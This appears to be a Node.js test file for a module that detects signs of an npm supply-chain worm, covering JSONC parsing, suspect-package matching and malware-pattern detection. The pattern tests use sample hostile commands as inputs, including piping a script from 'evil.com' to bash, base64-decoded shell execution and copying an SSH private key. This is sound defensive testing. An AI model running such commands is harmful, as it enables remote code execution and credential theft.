// tests for patterns.js — the shared IOC detection module
'use strict';

const { describe, it } = require('node:test');
const assert = require('node:assert');
const patterns = require('../patterns.js');

describe('patterns.js', () => {
  describe('constants', () => {
    it('SUSPECT_SCOPES is a non-empty array', () => {
      assert.ok(Array.isArray(patterns.SUSPECT_SCOPES));
      assert.ok(patterns.SUSPECT_SCOPES.length > 0);
    });
    it('SUSPECT_PACKAGES is a non-empty array', () => {
      assert.ok(Array.isArray(patterns.SUSPECT_PACKAGES));
      assert.ok(patterns.SUSPECT_PACKAGES.length > 0);
    });
    it('FINGERPRINT_STRINGS is a non-empty array', () => {
      assert.ok(Array.isArray(patterns.FINGERPRINT_STRINGS));
      assert.ok(patterns.FINGERPRINT_STRINGS.length > 0);
    });
    it('SUSPICIOUS_PATTERNS is a non-empty array of {re, why}', () => {
      assert.ok(Array.isArray(patterns.SUSPICIOUS_PATTERNS));
      assert.ok(patterns.SUSPICIOUS_PATTERNS.length > 0);
      for (const p of patterns.SUSPICIOUS_PATTERNS) {
        assert.ok(p.re instanceof RegExp, `pattern ${p.why} has no RegExp`);
        assert.ok(typeof p.why === 'string', `pattern has string why`);
      }
    });
  });

  describe('parseJsonc', () => {
    it('parses valid JSON', () => {
      const result = patterns.parseJsonc('{"key": "value"}');
      assert.deepStrictEqual(result, { key: 'value' });
    });
    it('parses JSON with line comments', () => {
      const result = patterns.parseJsonc('{\n  // this is a comment\n  "key": "value"\n}');
      assert.deepStrictEqual(result, { key: 'value' });
    });
    it('parses JSON with block comments', () => {
      const result = patterns.parseJsonc('{\n  /* multi\n     line */\n  "key": "value"\n}');
      assert.deepStrictEqual(result, { key: 'value' });
    });
    it('parses JSON with trailing commas', () => {
      const result = patterns.parseJsonc('{"a": 1, "b": 2,}');
      assert.deepStrictEqual(result, { a: 1, b: 2 });
    });
    it('parses a tasks.json-like structure', () => {
      const jsonc = `{
        // VS Code tasks
        "version": "2.0.0",
        "tasks": [
          {
            "label": "build",
            "type": "shell",
            "command": "echo hello",
            "group": "build",
          }
        ]
      }`;
      const result = patterns.parseJsonc(jsonc);
      assert.strictEqual(result.version, '2.0.0');
      assert.strictEqual(result.tasks.length, 1);
      assert.strictEqual(result.tasks[0].label, 'build');
    });
    it('handles strings that contain comment-like characters', () => {
      const result = patterns.parseJsonc('{"url": "https://example.com", "desc": "a // b"}');
      assert.strictEqual(result.url, 'https://example.com');
      assert.strictEqual(result.desc, 'a // b');
    });
    it('throws on truly malformed input', () => {
      assert.throws(() => patterns.parseJsonc('{not json at all'));
    });
    it('parses empty object', () => {
      assert.deepStrictEqual(patterns.parseJsonc('{}'), {});
    });
    it('parses arrays with trailing commas', () => {
      const result = patterns.parseJsonc('{"arr": [1, 2, 3,]}');
      assert.deepStrictEqual(result, { arr: [1, 2, 3] });
    });
  });

  describe('patternHits', () => {
    it('returns empty array for clean text', () => {
      const hits = patterns.patternHits('console.log("hello world");');
      assert.deepStrictEqual(hits, []);
    });
    it('detects curl pipe to bash', () => {
      const hits = patterns.patternHits('curl https://evil.com/script.sh | bash');
      assert.ok(hits.some(h => h.includes('downloads and pipes')));
    });
    it('detects eval() usage', () => {
      const hits = patterns.patternHits('eval(Buffer.from(code, "base64").toString())');
      assert.ok(hits.some(h => h.includes('dynamic code execution')));
    });
    it('detects base64 decode', () => {
      const hits = patterns.patternHits('echo d29ybQo= | base64 -d | bash');
      assert.ok(hits.some(h => h.includes('base64 decode')));
    });
    it('detects child_process usage', () => {
      const hits = patterns.patternHits('require("child_process").execSync("whoami")');
      assert.ok(hits.some(h => h.includes('spawns child processes')));
    });
    it('detects credential file access', () => {
      const hits = patterns.patternHits('cat ~/.ssh/id_rsa > /tmp/key');
      assert.ok(hits.some(h => h.includes('credential/secret locations')));
    });
    it('detects environment variable extraction', () => {
      const hits = patterns.patternHits('process.env.GITHUB_TOKEN');
      assert.ok(hits.some(h => h.includes('sensitive environment variables')));
    });
    it('detects fingerprint strings', () => {
      const hits = patterns.patternHits('// Miasma: The Spreading Blight v2');
      assert.ok(hits.some(h => h.includes('worm fingerprint')));
    });
    it('detects Shai-Hulud fingerprint', () => {
      const hits = patterns.patternHits('/* Shai-Hulud payload */');
      assert.ok(hits.some(h => h.includes('worm fingerprint')));
    });
    it('handles empty string', () => {
      assert.deepStrictEqual(patterns.patternHits(''), []);
    });
  });

  describe('depMatches', () => {
    it('matches suspect package by exact name', () => {
      assert.strictEqual(patterns.depMatches('@vapi-ai/server-sdk'), true);
    });
    it('matches suspect scope package', () => {
      assert.strictEqual(patterns.depMatches('@redhat-cloud-services/frontend-components'), true);
    });
    it('matches a nested package under suspect scope', () => {
      assert.strictEqual(patterns.depMatches('@redhat-cloud-services/utils/foo'), true);
    });
    it('does not match a benign package', () => {
      assert.strictEqual(patterns.depMatches('express'), false);
    });
    it('does not match package with similar but different scope', () => {
      assert.strictEqual(patterns.depMatches('@redhat-cloud'), false);
    });
  });
});
